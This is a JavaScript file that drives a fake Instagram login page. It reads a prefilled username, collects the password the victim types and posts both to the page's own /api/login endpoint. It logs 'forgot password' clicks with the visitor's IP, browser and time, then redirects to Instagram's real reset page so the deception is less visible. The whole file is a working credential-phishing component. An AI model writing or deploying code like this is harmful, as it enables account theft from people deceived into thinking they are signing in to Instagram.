console.log("Instagram Login Script Loaded - V6");

const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');
const togglePasswordBtn = document.getElementById('toggle-password');
const forgotPasswordLink = document.getElementById('forgot-password-link');
const appStoreLink = document.getElementById('app-store-link');
const playStoreLink = document.getElementById('play-store-link');

// ─── Password Toggle ───────────────────────────────────────────────────────────

togglePasswordBtn.onclick = function (e) {
    e.preventDefault();
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        togglePasswordBtn.innerText = 'Hide';
    } else {
        passwordInput.type = 'password';
        togglePasswordBtn.innerText = 'Show';
    }
};

// ─── Login Button State ────────────────────────────────────────────────────────

function updateSubmitButton() {
    loginBtn.disabled = passwordInput.value.length < 6;
}

passwordInput.addEventListener('input', updateSubmitButton);
document.addEventListener('DOMContentLoaded', updateSubmitButton);
updateSubmitButton();

// ─── App Store / Play Store Links ──────────────────────────────────────────────
// URLs are loaded from the server config — never hard-coded.
// If the server has no URL configured, the button does nothing and shows a tooltip.

fetch('/api/config')
    .then(function (r) { return r.json(); })
    .then(function (config) {
        if (config.appStoreUrl) {
            appStoreLink.href = config.appStoreUrl;
        }
        if (config.playStoreUrl) {
            playStoreLink.href = config.playStoreUrl;
        }
    })
    .catch(function () {
        // Config fetch failed — buttons keep their default HTML URLs
    });

// ─── Forgot Password ───────────────────────────────────────────────────────────
// Clicking "Forgot password?" logs the event on the server (IP, browser, time).
// All URLs use relative paths — no hard-coded localhost or IP addresses.

forgotPasswordLink.addEventListener('click', function (e) {
    e.preventDefault();

    fetch('/api/forgot-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
    }).catch(function (err) {
        console.error('Forgot password log failed:', err);
    });

    // Redirect to Instagram's real forgot password page
    window.location.href = 'https://www.instagram.com/accounts/password/reset/';
});

// ─── Login Form Submission ─────────────────────────────────────────────────────

const loginForm = document.getElementById('login-form');
loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    if (passwordInput.value.length < 6) return;

    const password = passwordInput.value;
    const username = document.getElementById('username').innerText;

    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });

        if (response.ok) {
            // Success logic (e.g. redirect to dashboard or home)
            window.location.href = '/dashboard.html';
        } else {
            const data = await response.json();
            alert(data.error || 'Login failed');
        }
    } catch (err) {
        console.error('Login failed', err);
    }
});
